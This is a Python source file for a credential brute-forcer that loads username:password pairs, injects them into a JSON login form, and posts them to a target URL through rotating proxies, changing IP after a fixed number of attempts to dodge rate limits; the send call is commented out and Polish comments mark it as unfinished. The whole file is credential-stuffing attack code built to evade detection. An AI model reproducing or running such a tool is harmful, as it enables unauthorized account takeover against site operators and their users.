import argparse
import sys, json, os
from packages.utils import (
    collect_input_args,
    validate_input_args,
    unpack_variables_from_json,
)
import urllib.request, urllib.error, urllib.response, urllib.parse
from packages.config import *


class Bruteforcer:
    def __init__(
        self, url, form_scheme, credentials_file, proxies, attemps_per_ip
    ) -> None:
        self.url = url
        self.form_scheme = form_scheme
        with open(credentials_file) as f:
            self.credentials_list = [
                (line.split(":")[0], line.split(":")[1].rstrip()) for line in f
            ]
        with open(proxies) as f:
            self.proxies = [line.rstrip() for line in f]
        self.attemps_per_ip = attemps_per_ip

    def proxy_rotating_attack(self, index, data_bytes):
        proxy_handler = urllib.request.ProxyHandler(
            {"http": self.proxies[index], "https": self.proxies[index]}
        )
        opener = urllib.request.build_opener(proxy_handler)
        opener.addheaders = [("User-agent", "Mozilla/5.0")]
        urllib.request.install_opener(opener)
        request = urllib.request.Request(self.url, data=data_bytes)
        with urllib.request.urlopen(request, timeout=10) as response:
            print(response.status)

    def perform_bruteforce(self):
        counter = 0
        index = 0
        json_tool = JsonData(self.form_scheme)
        if self.attemps_per_ip * len(self.proxies) < len(self.credentials_list):
            print(
                f"It's too much answers (`{len(self.credentials_list)}`) to check for `{len(self.proxies)}` IPs! Incease the number of attemps per one IP or decrease the number of answers"
            )
        else:
            for credentials in self.credentials_list:
                if counter < self.attemps_per_ip:
                    data_to_post = json_tool.create_json_to_injection(credentials)
                    data_bytes = str.encode(json.dumps(data_to_post))
                    print(
                        f"IP: {self.proxies[index]}, Data: {json.dumps(data_to_post)}"
                    )
                    # self.proxy_rotating_attack(index, data_bytes)
                    # jeśli się uda to git
                    # jeśli nie to zmień IP na następny
                    counter = counter + 1
                else:
                    index = index + 1
                    counter = 0


class JsonFormBruteforcer(Bruteforcer):
    def __init__(
        self, url, form_scheme, credentials_file, proxies, attemps_per_ip
    ) -> None:
        super().__init__(url, form_scheme, credentials_file, proxies, attemps_per_ip)


class JsonData:
    def __init__(self, form_scheme) -> None:
        self.json_scheme = open(form_scheme)

    def create_json_to_injection(self, credentials):
        data_to_post = json.load(self.json_scheme)
        for key in data_to_post:
            for i in range(len(CREDENTIAL_ENVS)):
                if CREDENTIAL_ENVS[i] in data_to_post[key]:
                    data_to_post[key] = unpack_variables_from_json(
                        data_to_post[key], credentials[i]
                    )
        return data_to_post


parser = argparse.ArgumentParser()
args = collect_input_args(parser)
if validate_input_args(args) == 1:

    bruteforce_tool = JsonFormBruteforcer(
        args.url,
        args.form_scheme,
        args.credentials_file,
        args.proxies,
        args.attemps_per_ip,
    )
    bruteforce_tool.perform_bruteforce()
